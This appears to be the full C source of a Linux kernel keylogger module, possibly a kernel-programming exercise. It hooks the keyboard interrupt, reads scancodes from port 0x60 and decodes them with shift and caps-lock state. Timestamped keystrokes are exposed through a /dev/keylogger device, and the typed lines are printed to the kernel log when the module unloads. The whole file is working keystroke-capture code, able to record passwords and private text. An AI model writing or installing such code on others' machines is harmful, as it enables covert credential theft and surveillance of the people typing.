#include "keylog.h"
#include "keymap.h"
#include <linux/mutex.h>

#define KEYBOARD_IRQ	1
#define SHIFT_L		42
#define SHIFT_R		54
#define CAPS_LOCK	58

#define	MODULE_NAME	"keylogger"

#define BUF_SIZE	PAGE_SIZE

/*
static struct s_stroke {
	unsigned char		key;
	unsigned char		state;
	char			name[25];
	char			value;
	struct tm		time;
	struct list_head	stroke_lst;
};

struct keyboard_map {
  int   key;
  int   ascii;
  char  str[25];
  int   ascii_shift;
  char  shift_str[25];
  bool  pressed;
};

*/
static unsigned char scancode;

DEFINE_SPINLOCK(mr_lock);

enum {
	RELEASED,
	PRESSED
};

struct list_head	head_stroke_lst_head;
struct proc_dir_entry	*entry;
char			line[BUF_SIZE];
bool 			shift = 0;
bool 			caps_lock = 0;

LIST_HEAD(head_stroke_lst);


int keylog_show(struct seq_file *seq_file, void *p)
{
	struct s_stroke		*strokes = NULL;

	list_for_each_entry_reverse(strokes, &head_stroke_lst, stroke_lst)
	{
		seq_printf(seq_file, "%i:%i:%i: %s (%d) %s\n",
			   strokes->time.tm_hour,
			   strokes->time.tm_min,
			   strokes->time.tm_sec,
			   strokes->name,
			   strokes->key,
			   strokes->state == RELEASED ? "RELEASED" : "PRESSED"
			   );
	}
	return 0;
}

static int keylog_open(struct inode *inode, struct file *file)
{
	int ret;

	spin_lock(&mr_lock);
	file->private_data = NULL;
	ret = single_open(file, &keylog_show, NULL);
	spin_unlock(&mr_lock);
	return ret; 
}

static ssize_t	keylog_write(struct file *file, const char __user *buf,
			  size_t size, loff_t *offset)
{
//	file->private_data = NULL;
	return 0;
}

static ssize_t keylog_read(struct file *file, char __user *buf, size_t size,
			 loff_t *offset)
{
	int	ret;

//	file->private_data = NULL;
	spin_lock(&mr_lock);
	ret = seq_read(file, buf, size, offset);
	spin_unlock(&mr_lock);
	return ret;
}

static int keylog_release(struct inode *inode, struct file *file)
{
	int	ret;

	spin_lock(&mr_lock);
	ret = single_release(inode, file);
	spin_unlock(&mr_lock);
	return ret;
}

static struct file_operations const keylog_file_fops = {
	.owner		= THIS_MODULE,
	.open = keylog_open,
	.write = keylog_write,
	.read = keylog_read,
	.release = keylog_release,
	.llseek = seq_lseek,
};

static struct miscdevice		keylog_dev = {
	MISC_DYNAMIC_MINOR,
	MODULE_NAME,
	&keylog_file_fops
};

static irqreturn_t keyboard_handler (int irq, void *dev_id)
{
	struct s_stroke		*new;
	struct timespec ts;
	struct keyboard_map	*entry;

	getnstimeofday(&ts);
	spin_lock(&mr_lock);
	scancode = inb (0x60);
	spin_unlock(&mr_lock);
	new = kmalloc(sizeof(struct s_stroke), GFP_ATOMIC);
	if (new) {
		new->key =  scancode & 0x7f;
		entry = &keyboard_mapping[new->key];
		memset(new->name, 0, sizeof(new->name));
		memcpy(new->name, entry->str, strlen(entry->str));
		new->state = (scancode & 0x80) ? RELEASED : PRESSED;
		entry->pressed = new->state == PRESSED ? true : false;
		caps_lock = entry->pressed && new->key == CAPS_LOCK ? !caps_lock : caps_lock;
		shift = keyboard_mapping[SHIFT_R].pressed | keyboard_mapping[SHIFT_L].pressed;
		if (isalpha(entry->ascii))
			new->value = shift == caps_lock ? entry->ascii : entry->shift_ascii; 
		else
			new->value = shift ? entry->shift_ascii : entry->ascii; 
		time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &new->time);
		list_add(&new->stroke_lst, &head_stroke_lst);
	}

	return IRQ_HANDLED;
}

static int __init keyboard_irq_init(void)
{
	int ret;

	ret = misc_register(&keylog_dev);
	if (ret < 0) 
		return -ENOMEM;
	ret = request_irq(KEYBOARD_IRQ, keyboard_handler, IRQF_SHARED,
			"keyboard", (void *)keyboard_handler);
	if (ret) {
		pr_err("can't get shared interrupt for keyboard\n");
		return -1;
	}
	printk (KERN_ERR "init okay!\n");
	return 0;
}

static void __exit keyboard_irq_exit(void)
{
	struct s_stroke		*strokes = NULL;
	char			buffer[80];

	memset(buffer, 0, 80);
	list_for_each_entry_reverse(strokes, &head_stroke_lst, stroke_lst)
	{
		if (strokes->state == PRESSED) {
			if (isprint(strokes->value)) {
				line[strlen(line)] = strokes->value;
			}
			else if (strokes->value == 13) {
				pr_err("%s\n", line);
				memset(line, 0, PAGE_SIZE);
			}
		}
		kfree(strokes);
	}
	pr_err("%s\n", line);
	misc_deregister(&keylog_dev);
	free_irq(KEYBOARD_IRQ, (void *)(keyboard_handler));
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("abonneca");
MODULE_DESCRIPTION("A keyboard irq module");

module_init(keyboard_irq_init);
module_exit(keyboard_irq_exit);
